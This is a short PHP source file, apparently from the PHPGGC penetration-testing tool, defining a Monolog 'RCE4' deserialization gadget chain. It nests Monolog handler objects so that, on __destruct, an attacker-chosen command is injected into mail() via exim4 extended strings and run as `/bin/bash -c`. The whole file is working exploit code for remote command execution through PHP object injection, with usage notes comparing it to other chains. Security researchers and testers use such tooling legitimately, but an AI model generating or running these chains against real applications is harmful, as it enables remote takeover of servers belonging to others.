<?php

namespace GadgetChain\Monolog;

class RCE4 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '? <= 2.4.4+';
    public static $vector = '__destruct';
    public static $author = 'whira';
    public static $information = '
        This chain will target debian based distribution (exim4 MTA) as it will perform a command injection on mail() 
        and use exim4 extended strings, the payload is `/bin/bash -c "$command"`.
        As this GC requires a setup that is specific, you should have better results by running Monolog/RCE1 or
        Monolog/RCE2 instead.
    ';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Monolog\Handler\RollbarHandler(
            new \Monolog\Handler\BufferHandler(
                new \Monolog\Handler\NativeMailerHandler($command)
            )
        );
    }
}
